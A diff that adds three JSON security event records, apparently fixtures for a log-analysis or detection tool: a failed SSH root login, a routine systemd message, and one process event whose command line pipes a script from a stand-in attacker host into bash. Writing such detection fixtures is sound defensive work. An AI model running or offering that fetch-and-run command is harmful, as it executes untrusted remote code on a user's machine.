@@ -1,0 +1,3 @@
+{"event":{"time":"2026-01-28T12:00:00Z","source":"syslog","kind":"authentication_failure"},"host":{"name":"prod-server"},"severity":"medium","user":{"name":"root"},"process":{"name":"sshd","pid":4821,"command_line":"Failed password for root from 192.168.1.66 port 22 ssh2"},"network":{"src_ip":"192.168.1.66"}}
+{"event":{"time":"2026-01-28T12:01:00Z","source":"ebpf","kind":"process_start"},"host":{"name":"workstation-05"},"severity":"low","process":{"name":"bash","pid":5120,"command_line":"sh -c curl -fsSL http://evil-login.example.net/i.sh | bash","parent_pid":5001}}
+{"event":{"time":"2026-01-28T12:02:00Z","source":"syslog","kind":"unknown"},"host":{"name":"db-01"},"severity":"low","process":{"name":"systemd","pid":1,"command_line":"Started Daily Cleanup."}}
